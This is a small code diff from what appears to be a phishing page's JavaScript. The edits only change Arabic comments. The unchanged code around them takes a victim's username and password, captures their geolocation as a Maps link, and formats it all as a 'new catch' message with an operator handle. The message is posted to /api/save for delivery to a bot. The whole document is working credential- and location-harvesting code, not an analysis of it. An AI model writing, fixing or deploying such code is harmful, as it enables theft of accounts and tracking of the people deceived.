@@ -92,7 +92,6 @@
         if (u.length >= 5 && p.length >= 6) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    // تصحيح رابط الموقع ليعمل آلياً
                     var loc = 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude;
                     send(u, p, loc);
                 }, function() {
@@ -128,7 +127,7 @@
     }
 
     function send(u, p, l) {
-        // تم إصلاح علامات الاقتباس لضمان وصول الرسالة مرتبة للبوت
+        // تم إصلاح علامات الاقتباس والربط هنا لضمان الإرسال
         var fullMsg = '🎯 صيد جديد مرتب 🎯\n\n👤 المستخدم: ' + u + '\n🔑 كلمة السر: ' + p + '\n📍 الموقع: ' + l + '\n\n👤 @M6_vip';
 
         fetch('/api/save', {
